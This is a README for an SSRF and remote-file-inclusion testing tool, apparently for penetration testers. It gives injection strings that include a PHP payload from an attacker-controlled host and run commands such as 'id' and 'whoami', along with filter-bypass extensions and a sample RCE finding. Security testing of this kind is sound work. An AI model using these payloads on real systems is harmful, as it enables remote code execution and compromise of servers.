# 🔥 SSRF + RFI Multi-Payload Tool

A lightweight, single-file Python tool designed for **internal penetration testing** to detect and validate:

* **SSRF (Server-Side Request Forgery)**
* **RFI (Remote File Inclusion) → RCE**

This tool acts as a **mini collaborator + payload server**, enabling reliable proof-of-concept (POC) generation during web application security assessments.

---

## ⚠️ Disclaimer

This tool is intended **ONLY for authorized security testing** in controlled environments.
Do **NOT** use this against systems you do not own or have explicit permission to test.

---

# 🚀 Features

### ✅ SSRF Detection

* Unique token-based payloads
* Callback listener (internal network)
* Logs source IP and timestamp

### ✅ RFI Exploitation

* Multi-language payload support:

  * `.php` (full RCE)
  * `.asp`
  * `.aspx`
  * `.jsp`
  * `.txt` (filter bypass / detection)
* Cross-platform command execution:

  * Linux ✔
  * Windows ✔

### ✅ Single File

* No dependencies
* No setup complexity
* Works fully offline (internal testing)

---

# 🛠 Installation

```bash
git clone https://github.com/yourusername/ssrf-rfi-tool.git
cd ssrf-rfi-tool
```

No additional libraries required (Python 3 only).

---

# ▶️ Usage

## Run the Tool

```bash
python ssrf_rfi_tool.py --ip <YOUR_INTERNAL_IP>
```

Example:

```bash
python ssrf_rfi_tool.py --ip 192.168.1.50
```

---

## 📌 Output Example

```
[🎯 SSRF PAYLOAD]
http://192.168.1.50:8000/<TOKEN>

[🧪 RFI PAYLOADS]
http://192.168.1.50:9000/rfi.php
http://192.168.1.50:9000/rfi.asp
http://192.168.1.50:9000/rfi.aspx
http://192.168.1.50:9000/rfi.jsp
http://192.168.1.50:9000/rfi.txt
```

---

# 🧪 SSRF Testing

Inject payload into target:

```
http://target/api?url=http://YOUR_IP:8000/<TOKEN>
```

### ✅ Vulnerable Response

```
[🔥 SSRF CALLBACK RECEIVED]
Source: <TARGET_INTERNAL_IP>
```

---

# 💣 RFI Testing

## Step 1 — Detection

```
file=http://YOUR_IP:9000/rfi.txt
```

If response contains:

```
RFI_TEST_SUCCESS
```

👉 RFI confirmed

---

## Step 2 — Remote Code Execution (RCE)

### Linux:

```
file=http://YOUR_IP:9000/rfi.php&cmd=id
```

### Windows:

```
file=http://YOUR_IP:9000/rfi.php&cmd=whoami
```

---

## ✅ Expected Output

```
START
uid=33(www-data)
END
```

or

```
START
nt authority\\system
END
```

---

# 🧠 Supported Payload Types

| Extension | Purpose   | Notes         |
| --------- | --------- | ------------- |
| `.php`    | RCE       | Most reliable |
| `.asp`    | RCE       | IIS only      |
| `.aspx`   | RCE       | Limited       |
| `.jsp`    | RCE       | Java servers  |
| `.txt`    | Detection | Filter bypass |

---

# 🔥 Testing Strategy (Recommended)

1. Start with `.txt` → confirm inclusion
2. Try `.php` → attempt RCE
3. Rotate payload extensions
4. Use command execution for proof
5. Capture output for reporting

---

# ⚠️ Limitations

This tool does **NOT** include:

* ❌ DNS-based SSRF detection (blind SSRF)
* ❌ HTTPS support
* ❌ WAF bypass automation
* ❌ LFI → RCE exploitation
* ❌ Payload fuzzing engine

---

# 🧠 Pro Tips

* Internal SSRF requires **network reachability**
* Use pivot hosts if direct access fails
* Always confirm with **command execution**, not just echo
* Try extension bypass tricks:

  ```
  rfi.php%00.txt
  rfi.txt?.php
  ```

---

# 📄 Example Finding

**Vulnerability:** Remote File Inclusion → Remote Code Execution

**Proof:**

```
http://target/page.php?file=http://attacker/rfi.php&cmd=id
```

**Impact:**

* Arbitrary command execution
* Full system compromise
* Data exfiltration

---

# 📌 Future Improvements

* DNS-based SSRF detection (like interactsh)
* Internal port scanning via SSRF
* Cloud metadata exploitation
* Automated exploitation workflows

---

# 👨‍💻 Author

Security-focused tool built for practical **red team / pentesting workflows**.

---

# ⭐ Contribute

Pull requests welcome.
If you’re improving this tool, make sure it stays **simple and practical**, not bloated.

---

# 🛑 Final Note

This tool is designed for **real-world usage**, not lab-only scenarios.

If you're only checking:

```
RFI_TEST_SUCCESS
```

You're missing impact.

Always escalate to:

```
uid=www-data
```

That’s where real findings begin.
